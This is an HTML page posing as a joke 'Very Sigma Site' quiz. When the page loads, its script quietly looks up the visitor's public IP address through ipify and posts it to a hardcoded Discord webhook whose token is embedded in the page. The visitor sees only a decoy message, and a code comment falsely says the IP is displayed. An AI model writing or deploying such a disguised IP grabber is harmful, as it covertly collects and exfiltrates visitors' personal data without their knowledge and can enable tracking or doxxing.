<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Very Sigma Site</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #121212; color: white; }
        #message { font-size: 30px; font-weight: bold; color: #00FF00; }
        h1 { font-size: 50px; color: #FF4500; }
    </style>
</head>
<body>
    <h1>Very Sigma Site</h1>
    <p id="message">Very sigma you are</p>

    <script>
        // Fetch IP address
        fetch('https://api64.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const userIP = data.ip; // Get the IP from the API response
                document.getElementById('message').textContent = `Results: you are uhh, idk`; // Display the IP on the page

                // Send IP to the webhook
                return fetch('https://discord.com/api/webhooks/1354853629772824726/P_wYy-x_B49xkFv6gmuYpBP7Yc4Ndiqr7zs2rEIakC7m7zcUk2IHIGUD9VZo0FXngswo', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ content: `User's IP: ${userIP}` }) // Send the correct IP to the webhook
                });
            })
            .then(response => response.text())
            .then(result => {
                console.log('Webhook response:', result);
                console.log("Sigma.");
            })
            .catch(error => {
                console.error('Error:', error);
                document.getElementById('message').textContent = 'you are skibidi.';
            });
    </script>
</body>
</html>
